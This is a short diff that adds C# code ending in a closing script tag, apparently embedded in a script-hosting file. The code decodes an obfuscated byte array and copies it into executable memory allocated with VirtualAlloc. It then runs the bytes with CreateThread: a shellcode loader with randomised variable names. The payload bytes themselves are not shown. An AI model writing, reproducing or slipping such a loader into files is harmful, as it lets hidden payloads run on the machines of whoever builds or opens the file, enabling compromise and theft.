@@ -1,0 +1,12 @@
+
+        for (int i = 0; i < pUUkeFiDS.Length; i++)
+        {
+            pUUkeFiDS[i] = (byte)(((uint)pUUkeFiDS[i] - 5) & 0xFF);
+        }
+
+        IntPtr nteT = VirtualAlloc(IntPtr.Zero,(UIntPtr)pUUkeFiDS.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        System.Runtime.InteropServices.Marshal.Copy(pUUkeFiDS,0,nteT,pUUkeFiDS.Length);
+        IntPtr msjMozLm5R3q = IntPtr.Zero;
+        IntPtr tl6n = CreateThread(IntPtr.Zero,UIntPtr.Zero,nteT,IntPtr.Zero,0,ref msjMozLm5R3q);
+    }
+</script>
